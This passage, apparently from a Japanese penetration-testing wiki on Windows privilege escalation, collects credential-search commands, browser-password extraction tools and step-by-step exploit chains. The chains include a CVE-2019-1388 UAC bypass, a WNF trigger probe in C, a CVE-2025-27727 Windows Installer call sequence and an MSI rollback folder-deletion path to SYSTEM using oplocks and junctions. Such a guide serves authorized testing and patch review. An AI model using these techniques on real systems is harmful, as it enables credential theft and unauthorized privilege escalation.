Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### ごみ箱内の認証情報

アクセス可能なごみ箱の項目を調べ、削除されたバックアップや構成アーカイブに加え、ファイル名に認証情報が明記されたファイルを探します。有用な `.7z`、`.zip`、`.rar` のバックアップは、何か月も前のもので、一般的なファイル名が付いている場合があります。Windows は元のパスと削除時刻を `$I` レコードに保存し、削除されたファイルを対応する `$R` エントリとして保存します。アーカイブを開く前に、メタデータと現在のユーザーに読み取り権限があるかを確認してください。項目が見えるかどうかは、ボリューム、ユーザー SID、ファイルのアクセス許可によって異なるため、一覧が空でも復元可能なバックアップがないとは限りません。アーカイブ名は確認候補として扱い、有効なシークレットが含まれている証拠とみなさないでください。

アクセス可能な削除済み `.pfx` ファイルは、**コード署名**の手掛かりにもなります。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell でコード署名を行うには秘密鍵付きの証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールは署名者の ID とルールの適用範囲を評価します](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。別のアカウントで実行するには、現在のユーザーに対象スクリプトそのものを変更する権限があり、実効ルールがそのスクリプトと対象アカウントに対する変更後の署名を許可し、さらにスケジュールされたタスクなど、より高い権限を持つ実行主体が実際にそのスクリプトを実行する必要があります。`.pfx` というファイル名、証明書のサブジェクト、またはスクリプトへの書き込み権限だけでは、この一連の条件が満たされていることの証明にはなりません。秘密鍵を含むファイルを開いたりタスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも調べ、認証情報の手掛かりを探してください。BitLocker 回復キーのエクスポートは、HTML または TXT 形式で保存されていることがあり、名前の付いたバックアップアーカイブ内にある場合もあります。そのようなデータから、古いバックアップが含まれる別の暗号化データボリュームにアクセスできることがあります。アクセスが許可されている場合にのみ、ボリュームとアーカイブを調べてください。バックアップに `NTDS.dit` が含まれる場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)で説明されているように、対応する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、利用可能な回復キーやドメインバックアップが存在する証拠にはなりません。

複数のプログラムに保存された**パスワードを復元する**には、次を利用できます：[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性があるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome、Edge、Firefox** のパスワードが保存されているデータベースを確認してください。\
ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが保存されている**可能性もあります。

現在のユーザーの標準的な Edge **Default** プロファイルでは、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` はその親ディレクトリである `User Data` にあります。[Microsoft のドキュメントには既定のプロファイルの場所が記載されています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや `UserDataDir` ポリシーによって、場所が変更されている場合があります。ファイルが存在することは、認証情報の保存先を調べる手掛かりにすぎません。ファイルを読み取れること、該当ユーザーの DPAPI コンテキストまたはその他の認可された鍵素材を利用できること、保存されたログイン情報がより高い権限を持つアカウントのものかどうかを確認してください。パスだけを列挙する場合、データベースを開いたり、復号したパスワードを表示したりする必要はありません。

Firefox について、[Mozilla のドキュメント](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、プロファイル内の `key4.db` と `logins.json` は、鍵ファイルと暗号化されたログイン情報の対になっています。これらのファイルが存在することは手掛かりにすぎません。両方のファイルが読み取り可能か、保存されたエントリーが存在するか、認証情報を利用可能と判断する前に、Primary Password によって鍵が保護されているかを確認してください。回収した認証情報がドメインアカウントのものなら、そのアカウントの実効的なグループ制御権限と、グループの [LAPS パスワードの読み取り権限または復号権限](../active-directory-methodology/laps.md)を個別に確認してください。ブラウザーのアーティファクトだけでは、管理者権限を取得できる経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、異なる言語で作られたソフトウェアコンポーネント間の**相互通信**を可能にする、Windows オペレーティングシステムに組み込まれた技術です。各 COM コンポーネントは**クラス ID (CLSID) によって識別**され、各コンポーネントは、インターフェース ID (IID) によって識別される 1 つ以上のインターフェースを通じて機能を公開します。

COM クラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** をマージして作成されます。

このレジストリの CLSID の下には、子レジストリ **InProcServer32** があります。ここには、**DLL** を指す**既定値**と、**Apartment** (シングルスレッド)、**Free** (マルチスレッド)、**Both** (シングルスレッドまたはマルチスレッド)、**Neutral** (スレッドに依存しない) のいずれかを指定できる **ThreadingModel** という値が含まれています。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリの CLSID の下には、子レジストリ InProcServer32 があります。ここには DLL を指す既定値と、値... が含まれています。](<../../images/image (729).png>)

基本的に、実行される DLL を**上書き**できる場合、その DLL が別のユーザーによって実行されるなら、**権限昇格**が可能です。

攻撃者が COM Hijacking を永続化の手段としてどのように利用するかは、次を確認してください。


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の一般的なパスワード検索**

**ファイルの内容を検索**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名を持つファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) は私が作成した **msf** plugin で、victim 内の credentials を検索するすべての metasploit POST module を**自動的に実行**します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで紹介しているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) も、システムからパスワードを抽出する優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## 漏洩したハンドル

**SYSTEM として実行されているプロセスが、フルアクセスで新しいプロセスを開く**（`OpenProcess()`）とします。同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限で実行される新しいプロセスも作成**します（`CreateProcess()`）。\
その後、**低い権限のプロセスにフルアクセスできる場合**、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を inject**できます。\
この脆弱性の**検出方法と悪用方法**について詳しくは、[この例](leaked-handle-exploitation.md)を参照してください。\
**プロセスやスレッドが異なる権限レベル（フルアクセスだけではありません）で継承した、その他のオープンハンドルをテストして悪用する方法を詳しく解説した別の記事**は[こちら](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)です。

## Named Pipe Client Impersonation

**pipes**と呼ばれる共有メモリセグメントにより、プロセス間の通信とデータ転送が可能になります。

Windows には **Named Pipes** と呼ばれる機能があり、異なるネットワーク上にある場合も含め、無関係なプロセス間でデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** が pipe 経由でデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限を持っていれば、**client の ID を偽装**できます。偽装可能な pipe を介して通信する**特権プロセス**を特定できれば、確立した pipe とそのプロセスが通信したときに、そのプロセスの ID を偽装して**より高い権限を取得**できます。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)のガイドを参照してください。

また、次のツールを使うと、burp のようなツールで **named pipe の通信を傍受**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。こちらのツールでは、privesc に利用できる pipe を探すために、すべての pipe を一覧表示して確認できます：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv のリモート DWORD 書き込みによる RCE

Telephony サービス（TapiSrv）は、サーバーモードで `\\pipe\\tapsrv`（MS-TRP）を公開します。リモートの認証済みクライアントは、mailslot ベースの非同期イベント経路を悪用し、`ClientAttach` を通じて `NETWORK SERVICE` が書き込み可能な既存ファイルに任意の **4-byte 書き込み**を実行できます。その後、Telephony 管理者権限を取得し、任意の DLL をサービスとしてロードできます。全体の流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存パスを設定して `ClientAttach` を実行します。サービスは `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` で指定された攻撃者制御の `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を登録し、`TRequestMakeCall`（`Req_Func 121`）を実行してから、`GetAsyncEvents`（`Req_Func 0`）で取得します。その後、登録解除または shutdown を行うことで、決定論的な書き込みを繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行される可能性のあるファイル拡張子

[https://filesec.io/](https://filesec.io/) を確認してください。

### Markdown レンダラーを介した Protocol handler / ShellExecute の悪用

`ShellExecuteExW` に渡されるクリック可能な Markdown リンクは、危険な URI handler（`file:`、`ms-appinstaller:`、または登録済みの任意の scheme）を起動し、現在のユーザーとして攻撃者制御のファイルを実行する可能性があります。詳細：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを含むコマンドラインの監視**

ユーザーとして shell を取得した場合、**コマンドラインに認証情報を渡す**スケジュールタスクやその他のプロセスが実行されていることがあります。以下のスクリプトは、2 秒ごとにプロセスのコマンドラインを取得し、現在の状態を前回の状態と比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効な場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから「NT\AUTHORITY SYSTEM」としてターミナルやその他のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC Bypass を同時に実行できます。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムには、以下のものがあります。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、以下の手順を実行する必要があります:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

必要なファイルと情報は、次の GitHub リポジトリにすべてあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への昇格 / UAC Bypass

**Integrity Levels**について学ぶには、こちらを読んでください。


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses**について学ぶには、こちらを読んでください。


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 配信ルートへの Upload Directory Junctions

アプリケーションが予測可能なアップロード用サブディレクトリを作成し、呼び出し元が指定したファイル名でそのディレクトリに書き込み、ファイルを処理する場合があります。権限の低いユーザーがサーバー側の書き込み前にそのサブディレクトリを削除し、NTFS junction に置き換えられると、書き込みが junction をたどって Web 配信ディレクトリに行われる可能性があります。サーバーがそのファイル形式を実行する場合、そこに配置されたスクリプトは Web サービスの実行ユーザーとして実行される可能性があります。これはアプリケーション固有の任意書き込み境界です。書き込み可能なアップロードディレクトリや既存の junction があるだけでは、これが成立する証拠にはなりません。

アップロードハンドラーでの正確なパス構築と処理のタイミング、サブディレクトリに対するユーザーの実効削除・作成権限、宛先の実効 ACL、書き込み処理が reparse point をたどるかどうか、Web サーバーが宛先でファイルを実行するかどうかを確認してください。書き込み処理と Web サーバーのプロセス ID は、それぞれ別々に確認してください。受動的なインベントリからディレクトリ ACL と reparse メタデータは確認できますが、ハンドラーの動作や、今後 junction が差し替えられるかどうかは判定できません。実行がサービスアカウントで行われる場合、別の token-privilege 経路を検討する前に、**実際のプロセストークン**を調べてください。

## WNF によってトリガーされる、特権タスクのスケジュール済みクリーンアップ

手動実行を拒否するスケジュール済みタスクでも、権限のないユーザーが利用できるトリガーが存在する場合があります。特権タスクを監査する際は、その XML をエクスポートし、タスクの DACL、プリンシパル、アクションに加えて、**すべての**トリガーを調べてください。特に、`WnfStateChangeTrigger` は Windows Notification Facility（WNF）の状態を指定します。その保護可能な状態で現在のユーザーによる更新の公開が許可されている場合、`<AllowStartOnDemand>false</AllowStartOnDemand>` に設定されていても、ユーザーはそのタスクを設定済みの ID で間接的に起動できます。<sup>[[43]](#references)</sup>

たとえば、Recall の `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` タスクは SYSTEM として実行され、標準ユーザーからの WNF 状態 `7508BCA32C079E41` の更新を受け付け、Recall が無効な場合でも `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` を調べていました。<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

到達可能性をテストするには、`ntdll.dll` から `ZwUpdateWnfStateData` を解決し、8 バイトの state name に対して空の更新を送信して、戻り値のステータスをタスクの最終実行データまたは Procmon のアクティビティと照合します。以下の簡略化したプローブでは、Recall タスクの例で使用されているバイト列を使っています。テスト対象のタスク用にエクスポートされたバイト列に置き換えてください。<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### 再帰的なクリーンアップを特権削除に変える

重要なプリミティブはトリガーそのものではなく、攻撃者が制御するディレクトリを受け取る特権クリーンアップルーチンです。列挙から最終的な変更までの処理を追跡しましょう。プロファイル／セッションの検出、ワイルドカードで選択された子要素、`SHCreateItemFromParsingName`、`IFileOperation::DeleteItem` は、事前にチェックされたパス名が後で再帰的にたどられることを示す有力な手掛かりです。子孫が信頼できるディレクトリハンドルを基準に開かれ、削除前に検証されない場合、攻撃者は列挙から使用までの間に名前解決先を変更できます。<sup>[[43]](#references)</sup>

WNF トリガーを、後述する[oplock、junction、Object Manager symlink による置換](#from-folder-contents-delete-to-system-eop)と組み合わせます。oplock により、正規の子要素を選択した後で cleaner の処理を一時停止させ、その間に書き込み可能な祖先ディレクトリを置き換えます。処理が再開すると、特権削除は `\RPC Control` を経由して保護対象を解決します。Recall の攻撃チェーンでは、これにより、文書化されている MSI rollback technique に必要な `C:\Config.Msi` の SYSTEM による削除が実現しました。<sup>[[31]](#references)[[43]](#references)</sup>

### ネストした子孫は浅い reparse point 対策を回避する

攻撃者が制御するルートとその直下の子要素だけを検証しても、再帰的なパス名ベースの削除は安全になりません。検証済みのオブジェクトは正規のままにして、junction/oplock による置換をその下の別の子要素に仕込みます。すると `IFileOperation::DeleteItem` は最終的に、検証されていない子孫に到達し、新しいターゲットをたどります。CVE-2026-20941 は、最初の Recall patch が `UKP` と GUID 形式のディレクトリを検証しながら、従来の再帰削除処理を残したことで、まさにこの種の不完全な修正から発生しました。<sup>[[43]](#references)</sup>

安全な方法は、**すべての子孫**を、すでに信頼されているディレクトリハンドルを基準に開き、最終的に解決されたパス／オブジェクトを取得して検証し、その検証済みハンドルに対して削除 disposition を適用することです。パスの一部を検証した後、再帰的なパス名ベースの削除に戻ってはいけません。patch のレビューでは、実際の呼び出し箇所における構造体も調べてください。このケースでは、`NtCreateFile` に渡された `OBJECT_ATTRIBUTES` を実行時に調べると、`RootDirectory` が null ではなく、相対名 `{GUID}\\secure_file.lock` が指定されていることが分かりました。これにより、2つ目の `FILE_DELETE_ON_CLOSE` プリミティブがあると示唆する誤解を招く逆コンパイラの出力が否定されました。<sup>[[43]](#references)</sup>

## 任意のフォルダーの削除／移動／名前変更から SYSTEM EoP へ

この technique は[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されており、exploit code は[**こちらから入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installer の rollback 機能を悪用し、アンインストール処理中に正規ファイルを悪意のあるファイルで置き換えます。そのために攻撃者は**悪意のある MSI installer**を作成し、これを使って `C:\Config.Msi` フォルダーを乗っ取ります。このフォルダーは後に Windows Installer が他の MSI package のアンインストール中に rollback ファイルを保存するために使うので、rollback ファイルを悪意のある payload を含むように改変しておきます。

### Windows Installer COM クリーンアップパスの注入（CVE-2025-27727）

低権限のクライアントは、`CMsiConfigurationManager` COM object（CLSID/IID `{000C101C-0000-0000-C000-000000000046}`）を介して、SYSTEM 権限で動作する `msiexec.exe` service にアクセスできます。リバースエンジニアリングにより、関連する `IMsiServer` 呼び出しは、vtable offset `0xA0` の `MsiBeginTransactionW`、`0xC8` の `SetEEUIDirectoryAndFilter`、`0x50` の `CleanupTempPackages` であると特定されました。これらの名前と offset はリバースエンジニアリングに基づくもので、build によって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter` は、指定されたパスを `DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT` を指定して開く間だけ、呼び出し元を偽装します。これにより、呼び出し元がディレクトリを削除できることが確認され、reparse point をたどることも回避されます。しかし、チェックしたファイルオブジェクトが後続のクリーンアップ処理に引き継がれることは保証されず、Windows Installer がそのオブジェクトを作成したことも証明されません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` の後、`SetEEUIDirectoryAndFilter` は、呼び出し元の filter 引数に関係なく、そのパスをフォルダーとして登録します。service は `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` の下に名前付き `REG_DWORD` 値を書き込みます。値の名前は呼び出し元が制御するパスで、データ `0x00000002` はフォルダー flag です。続いて `CleanupTempPackages(NULL, FALSE)` がクリーンアップを直接開始します。昇格された worker はレジストリ値を列挙し、パスの出所を確認せずにフォルダー項目を再帰的な `FDeleteFolder` に渡します。通常の削除に失敗した場合、コードは `LockdownPath` も呼び出し、ファイル属性をクリアしてから再試行します。<sup>[[41]](#references)</sup>

`msi.dll` から復元された最小限の呼び出しシーケンスは次のとおりです。<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用な primitive は junction によるリダイレクトではなく、パスの再利用です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に同じパス名で保護された rollback データを再作成させます。クリーンアップ処理は古い `TempPackages` 名を信頼して、新しいディレクトリを SYSTEM として削除します。reparse point は不要なため、この手法は `FILE_FLAG_OPEN_REPARSE_POINT` とリダイレクト信頼の軽減策が意図する境界を回避します。<sup>[[41]](#references)</sup>

この削除 primitive は、次の rollback chain に適用できます。独立した `Installer\Folders` レコードを保持したまま、保護された `C:\Config.Msi` を削除し、NULL DACL で再作成して、インストーラーが DACL を強化する前に `WRITE_DAC` が許可された handle を保持します。事前に開いた handle を使って `NtSetSecurityObject` で permissive な DACL を復元し、その後、rollback が再開する前に生成された `.rbs` を置き換えます。<sup>[[41]](#references)</sup>

Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにして、このパスを修正しました。COM 呼び出しは引き続き成功を返す場合がありますが、攻撃者が制御するパスは `TempPackages` に登録されなくなります。メソッドの戻り値が成功したかどうかでパッチを判定せず、2025 年 4 月の Windows セキュリティ更新プログラムを適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

手法の概要は次のとおりです。

1. **ステージ 1 – Hijack の準備（`C:\Config.Msi` を空のままにする）**

- ステップ 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - **「UAC Compliant」** としてインストーラーを設定し、**非管理者ユーザー**が実行できるようにします。
    - インストール後もファイルの **handle** を開いたままにします。

- ステップ 2: アンインストールを開始する
    - 同じ `.msi` をアンインストールします。
    - アンインストール処理はファイルを `C:\Config.Msi` に移動し、rollback backup として `.rbf` ファイルに名前を変更し始めます。
    - ファイルの open file handle を `GetFinalPathNameByHandle` で**ポーリング**し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- ステップ 3: 独自の同期処理
    - `.msi` には、次の処理を行う **カスタムアンインストールアクション（`SyncOnRbfWritten`）** が含まれます。
        - `.rbf` が書き込まれたことを通知します。
        - その後、別の event を待ってからアンインストールを続行します。

- ステップ 4: `.rbf` の削除をブロックする
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに `.rbf` ファイルを開きます。これにより、**ファイルの削除を防止**します。
    - その後、アンインストールを完了できるように通知を返します。
    - Windows Installer は `.rbf` の削除に失敗し、すべての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- ステップ 5: `.rbf` を手動で削除する
    - （攻撃者が）`.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` は空になり**、Hijack できる状態になります。

> この時点で、**SYSTEM レベルの任意フォルダー削除の脆弱性を実行**し、`C:\Config.Msi` を削除します。

2. **ステージ 2 – Rollback Script を悪意のあるものに置き換える**

- ステップ 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - 自分で `C:\Config.Msi` フォルダーを再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` が許可された handle を**開いたまま**にします。

- ステップ 7: 別のインストールを実行する
    - 次の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的な失敗を引き起こす変数。
    - このインストールを利用して、`.rbs` と `.rbf` を読み込む **rollback** を再度発生させます。

- ステップ 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
    - ファイル名を取得します。

- ステップ 9: Rollback 前に同期する
    - `.msi` には、次の処理を行う **カスタムインストールアクション（`SyncBeforeRollback`）** が含まれます。
        - `.rbs` が作成されたときに event を通知します。
        - その後、続行する前に待機します。

- ステップ 10: 弱い ACL を再適用する
    - `.rbs created` event を受信した後:
        - Windows Installer は `C:\Config.Msi` に**強い ACL を再適用**します。
        - ただし、`WRITE_DAC` が許可された handle をまだ保持しているため、**弱い ACL を再適用**できます。

> ACL は**handle を開くときにのみ適用される**ため、引き続きフォルダーに書き込めます。

- ステップ 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを、Windows に次の処理を指示する **偽の rollback script** で上書きします。
        - `.rbf` ファイル（悪意のある DLL）を、**特権のある場所**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元します。
    - **悪意のある SYSTEM レベルの payload DLL** を含む偽の `.rbf` を配置します。

- ステップ 12: Rollback を実行する
    - 同期 event を通知し、インストーラーを再開させます。
    - インストールを既知のタイミングで**意図的に失敗**させるよう、**type 19 のカスタムアクション（`ErrorOut`）** が設定されています。
    - これによって **rollback が開始**します。

- ステップ 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の処理を行います。
        - 悪意のある `.rbs` を読み込みます。
        - `.rbf` DLL をターゲットの場所にコピーします。
    - これで、**SYSTEM が読み込むパスに悪意のある DLL** が配置されます。

- 最終ステップ: SYSTEM のコードを実行する
    - Hijack した DLL を読み込む、信頼された **自動昇格バイナリ**（例: `osk.exe`）を実行します。
    - **これでコードが SYSTEM として実行されます**。


### 任意のファイル削除/移動/名前変更から SYSTEM EoP へ

主な MSI rollback 手法（前述）は、`C:\Config.Msi` などの**フォルダー全体を削除**できることを前提としています。しかし、脆弱性によって許可されるのが**任意のファイル削除**だけの場合はどうでしょうか。

**NTFS internals** を悪用できます。すべてのフォルダーには、次のような隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

このストリームには、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの `::$INDEX_ALLOCATION` ストリームを**削除**すると、NTFS はファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準的なファイル削除 API を使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* の削除 API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容削除から SYSTEM EoP へ
任意のファイルやフォルダーを削除できる primitive はなくても、攻撃者が制御するフォルダーの**内容を削除できる**としたらどうでしょうか？

1. Step 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって実行が**一時停止**します。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM process をトリガーする（例: `SilentCleanup`）
- この process はフォルダー（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、callback に制御が渡されます。

4. Step 4: oplock callback 内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所に移動する
    - oplock を解除せずに `folder1` を空にできます。
    - `file1.txt` を直接削除しないでください。oplock が早期に解除されてしまいます。

- Option B: `folder1` を **junction** に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

